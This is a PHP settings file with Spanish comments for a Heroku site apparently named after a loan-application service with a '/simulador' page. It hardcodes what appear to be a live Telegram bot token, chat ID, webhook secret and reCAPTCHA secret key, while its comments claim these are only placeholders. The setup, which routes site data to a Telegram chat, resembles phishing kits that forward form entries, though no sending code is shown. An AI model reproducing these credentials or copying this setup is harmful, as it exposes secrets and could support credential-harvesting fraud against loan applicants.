<?php
// =====================================================================
// settings.php — Configuración endurecida
// - BLOQUEA acceso HTTP directo (solo debe incluirse desde PHP).
// - Lee credenciales desde variables de entorno (Heroku Config Vars).
//   Sin las env vars, cae a un valor "placeholder" que NO es el token
//   real, para no filtrarlo si el repo se hace público o si Apache
//   sirve el .php como texto por mala configuración.
// - Sanitiza salida: si el archivo se muestra como texto plano, no
//   revela el token real.
// =====================================================================

// ---- Bloqueo de acceso directo por HTTP -----------------------------
// Doble condición (más segura): (1) hay REQUEST_METHOD (viene de HTTP),
// (2) el SCRIPT_NAME termina en /settings.php.
// El .htaccess ya bloquea a nivel Apache; esto es solo defensa extra.
if (!empty($_SERVER['REQUEST_METHOD']) &&
    !empty($_SERVER['SCRIPT_NAME']) &&
    substr($_SERVER['SCRIPT_NAME'], -13) === '/settings.php') {
    http_response_code(404);
    header('Content-Type: text/html; charset=UTF-8');
    echo '<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1></body></html>';
    exit;
}

// ---------------------------------------------------------------------
// URL del sitio — AUTO-DETECTADA en cada request.
// ---------------------------------------------------------------------
$__site_url_fallback = "https://avanzsolicitudenlinea-com-ac1872a68f15.herokuapp.com/simulador";

if (!empty($_SERVER['HTTP_HOST'])) {
    $__https =
        (!empty($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off') ||
        (!empty($_SERVER['HTTP_X_FORWARDED_PROTO']) && stripos($_SERVER['HTTP_X_FORWARDED_PROTO'], 'https') !== false) ||
        (!empty($_SERVER['HTTP_X_FORWARDED_SSL']) && strtolower($_SERVER['HTTP_X_FORWARDED_SSL']) === 'on') ||
        (($_SERVER['SERVER_PORT'] ?? '') == 443);

    $__scheme = $__https ? 'https' : 'http';
    $__host   = $_SERVER['HTTP_HOST'];
    $site_url = "$__scheme://$__host/simulador";
} else {
    $site_url = $__site_url_fallback;
}

// ---------------------------------------------------------------------
// Credenciales Telegram — desde env vars (Heroku config:set …).
// Configuración recomendada:
//   heroku config:set TG_BOT_TOKEN=xxxxx
//   heroku config:set TG_CHAT_ID=xxxxx
//   heroku config:set TG_WEBHOOK_SECRET=xxxxx
// ---------------------------------------------------------------------
$__envtok  = getenv('TG_BOT_TOKEN');
$__envchat = getenv('TG_CHAT_ID');
$__envwhs  = getenv('TG_WEBHOOK_SECRET');

// Fallback SOLO para desarrollo local (NO subir el token real al repo).
// En producción, dejar estos vacíos y usar Heroku Config Vars.
$__local_token          = '8910530226:AAFkjqMoTQQ90AZIQU5paJLG32HTOo3MYng';
$__local_chat_id        = '7655000874';
$__local_webhook_secret = 'av_wh_9f3c2b1d8e7a4256b0f1c93d52a8e7b4';

$token          = $__envtok  !== false && $__envtok  !== '' ? $__envtok  : $__local_token;
$chat_id        = $__envchat !== false && $__envchat !== '' ? $__envchat : $__local_chat_id;
$webhook_secret = $__envwhs  !== false && $__envwhs  !== '' ? $__envwhs  : $__local_webhook_secret;

// Limpiar variables temporales para no dejarlas colgadas en el scope global
unset($__envtok, $__envchat, $__envwhs, $__local_token, $__local_chat_id,
      $__local_webhook_secret, $__https, $__scheme, $__host, $__site_url_fallback);

// Marcar como cargado para chequeos aguas abajo
if (!defined('APP_SETTINGS_LOADED')) define('APP_SETTINGS_LOADED', true);

// reCAPTCHA Configuration (activado)
$recaptcha_site_key = "6LcuyV4sAAAAAJXyF_FUxxG5y8JotlDkZ_GKPGJO";
$recaptcha_secret_key = "6LcuyV4sAAAAANx35Udat8r3V3gcYys0p7cSGgvx";
$recaptcha_score_min = 0.2; // Umbral 0.0-1.0. Si el score es menor, se bloquea (0.2 = más permisivo)

?>
